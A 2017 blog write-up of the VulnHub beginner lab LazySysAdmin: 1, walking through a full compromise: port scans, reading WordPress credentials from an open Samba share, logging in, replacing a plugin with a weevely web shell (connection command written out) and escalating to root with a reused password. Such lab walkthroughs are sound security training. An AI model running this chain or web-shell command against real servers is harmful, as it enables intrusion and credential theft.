---
title: 'Writeup LazySysAdmin: 1'
date: 2017-11-13 00:00:00 +0000
layout: post
tags:
- vulnhub
- writeup
---
The difficulty of [LazySysAdmin](https://www.vulnhub.com/entry/lazysysadmin-1,205/) is described as "Beginner - Intermediate" and was my first machine is really rushed through. The authors description reads:

> "Teaching newcomers the basics of Linux enumeration. Myself, I suck with Linux and wanted to learn more about each service whilst creating a playground for others to learn"

Maybe too simple for many, but since it always feels good to "get root" LazySysAdmin is no exception and was fun to play.

The machine boots perfectly in VMWare and works in Host-only and NAT mode. Author Togie Mcdogie hints that "enumeration is key" and so I started by listing open ports:

    nmap -T4 -A -v 192.168.131.136
    
    22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    3306/tcp open  mysql       MySQL (unauthorized)
    6667/tcp open  irc         InspIRCd

Then I tried walking from one to another: Nmap shows that OpenSSH is listening on port 22. Metasploit's auxiliary scanner ssh_version gives more information:

    SSH server version: SSH-2.0-**OpenSSH_6.6.1p1** **Ubuntu**-2ubuntu2.8 ( service.version=6.6.1p1 openssh.comment=Ubuntu-2ubuntu2.8 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=**14.04** service.protocol=ssh fingerprint_db=ssh.banner

An ssh with verbose options (-vv) connect gives the following:

    debug1: Server host key: ecdsa-sha2-nistp256 SHA256:pHi3EZCmITZrakf7q4RvD2wzkKqmJF0F/SIhYcFzkOI
    debug1: match: OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8 pat OpenSSH_6.6.1\* compat 0x04000000

Trying to enumerate users (and testing default passwords) didn't work, but it's worth a try if you're not blocked:

![]({{ site.baseurl }}/forestryio/images/2017-11-13 23_37_12-Kali-Linux-Light-2017.2-vm-amd64 - VMware Workstation.png)

Anyway, every bit of information could be useful later on. Next step port 80:

80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))

Output from nikto:

    + Server: Apache/2.4.7 (Ubuntu)
    + Server leaks inodes via ETags, header found with file /, fields: 0x8ce8 0x5560ea23d23c0 
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + OSVDB-3268: /old/: Directory indexing found.
    + Entry '/old/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
    + OSVDB-3268: /test/: Directory indexing found.
    + Entry '/test/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
    + OSVDB-3268: /Backnode_files/: Directory indexing found.
    + Entry '/Backnode_files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
    + "robots.txt" contains 4 entries which should be manually viewed.
    + Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
    + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
    + OSVDB-3268: /apache/: Directory indexing found.
    + OSVDB-3092: /apache/: This might be interesting...
    + OSVDB-3092: /old/: This might be interesting...
    + Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22
    + Uncommon header 'x-ob_mode' found, with contents: 0
    + OSVDB-3092: /test/: This might be interesting...
    + /info.php: Output from the phpinfo() function was found.
    + OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
    + OSVDB-3233: /icons/README: Apache default file found.
    + /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
    + OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
    + Uncommon header 'link' found, with contents: <http://192.168.131.137/wordpress/index.php?rest_route=/>; rel="https://api.w.org/"
    + /wordpress/: A Wordpress installation was found.
    + /phpmyadmin/: phpMyAdmin directory found
    + 7690 requests: 0 error(s) and 27 item(s) reported on remote host
    + End Time:           2017-11-14 02:15:48 (GMT-5) (23 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested

I found a few interesting directories and files (robots.txt, info.php, apache, old, test, wordpress, phpmyadmin, ...). Time to browse the website:

![]({{ site.baseurl }}/forestryio/images/2017-11-11 21_14_56-debz - VMware Workstation.png)

On a first glance there's not much going on, but the`/wordpress/` directory reveal some secrets and vulnerabilities:

![]({{ site.baseurl }}/forestryio/images/2017-11-12 04_02_33-Configuración.png)

`/wp-includes/` and `/wp-content` are browsable, `index.php` reveals the Wordpress version `<meta name="generator" content="WordPress 4.8.1" />` in the source code.

wpscan identifies Wordpress default user `(admin, id1)`, directory listings and some potential vulnerabilities:

![]({{ site.baseurl }}/forestryio/images/2017-11-14 10_49_40-Exploit Collector.png)

At this point I could have tried to bruteforce the Wordpress login, but let's look at those open SAMBA ports, since they look promising (_Read:_ [_"Hacking and Gaining Access to Linux by Exploiting SAMBA Service"_](http://resources.infosecinstitute.com/hacking-and-gaining-access-to-linux-by-exploiting-samba-service/) _and_ [_"Exploit Samba "SmbClient"_](http://h2-exploitation.blogspot.com.es/2013/10/exploit-samba-smbclient.html)).

Enumerating with`smb-os-discovery` map script:

![]({{ site.baseurl }}/forestryio/images/2017-11-13 15_44_51-debz - VMware Workstation.png)

Listing shares with `smbclient -L 192.168.181.129 -U lazysysadmin -p 445` and browsing the remote share with `smbclient //192.168.181.129/share$ -U lazysysadmin -p 445`.:

![]({{ site.baseurl }}/forestryio/images/2017-11-13 15_50_24-Bandeja de entrada - Malte.Reidenbach@derten.com - Outlook.png)

At this point the machine is basically pwned. An open share of the web directory is all it takes to`cat wp-config`and get access to the database:

![]({{ site.baseurl }}/forestryio/images/2017-11-13 15_51_38-Bandeja de entrada - Malte.Reidenbach@derten.com - Outlook.png)

phpmyadmin:

![]({{ site.baseurl }}/forestryio/images/2017-11-13 15_52_41-Bandeja de entrada - Malte.Reidenbach@derten.com - Outlook.png)

Dumping the wp_users table:

![]({{ site.baseurl }}/forestryio/images/2017-11-14 17_17_46-debz - VMware Workstation.png)

    INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES
    (1, 'Admin', '$P$B.LCmtO3gkm0PdZNkBwgz2HQweq2Ur0', 'admin', 'togie@sectalks.org', 'http://www.sectalks.org', '2017-08-15 11:20:50', '', 0, 'Admin');

I could have tried bruteforcing the hash given that we know the salt from wp-config.php or [create a new user](https://www.inmotionhosting.com/support/edu/wordpress/333-add-admin-via-mysql), but I just tried my luck using the same pass to get into the admin panel:

![]({{ site.baseurl }}/forestryio/images/2017-11-13 16_05_00-debz - VMware Workstation.png)

![]({{ site.baseurl }}/forestryio/images/2017-11-13 16_06_48-debz - VMware Workstation.png)

_Note:_ `_togie_` _is a username._

After uploading a [weevely](https://github.com/epinna/weevely3) shell (using the plugin editor and replacing the hello-dolly plugin) I stumbled through the files:

`python weevely.py http://192.168.181.129/wordpress/wp-content/plugins/hello.php 1234`

    cat deets.txt 
    
    CBF Remembering all these passwords.
    
    Remember to remove this file and update your password after we push out the server.
    
    Password 12345
    
    
    cat todolist.txt 
    
    Prevent users from being able to view to web root using the local file browser

[weevely3](https://github.com/epinna/weevely3) has some commands for local linux enumeration and privilege escalation. Note that the weevely version in Kali hasn't been updated for quite some time and lacks some functions like the`:backdoor_meterpreter`. Search for weevely in github.

Here's how I used them to gain root.

`:audit_etcpasswd -real` gives back a userlist. `:audit_phpconfig` gives back a permission disaster, but I could've seen that before, since phpinfo.php was accessible. Lazy sysadmin...

I tested the pass from deets.txt against the users root and togie and voilà:

![]({{ site.baseurl }}/forestryio/images/2017-11-15 15_10_04-Security Breach and Spilled Secrets Have Shaken the N.S.A. to Its Core - The New.png)

    
    sudo -l
    
    [sudo] password for togie: 
    Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin
    User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
    

Togie is a sudo user!

![]({{ site.baseurl }}/forestryio/images/2017-11-15 15_15_23-Security Breach and Spilled Secrets Have Shaken the N.S.A. to Its Core - The New.png)

Let's see if LazySysAdmin 2 is a little more challenging.